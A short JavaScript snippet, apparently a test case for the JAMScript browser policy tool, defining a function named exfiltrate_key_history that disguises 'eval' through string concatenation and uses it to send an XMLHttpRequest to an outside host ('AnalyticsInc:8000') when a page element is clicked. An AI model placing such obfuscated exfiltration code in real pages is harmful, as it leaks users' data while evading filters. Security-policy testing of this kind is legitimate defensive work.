function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);';
  var v2 = "ev" + "al";
  if(JAMScript.isEval(eval)) {
    var v0 = eval("introspect(JAMScript.introspectors.processAll) { " + v2 + " }")
  }else {
    var v0 = JAMScript.call(eval, null, [v2])
  }
  JAMScript.call(v0, null, [exp]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

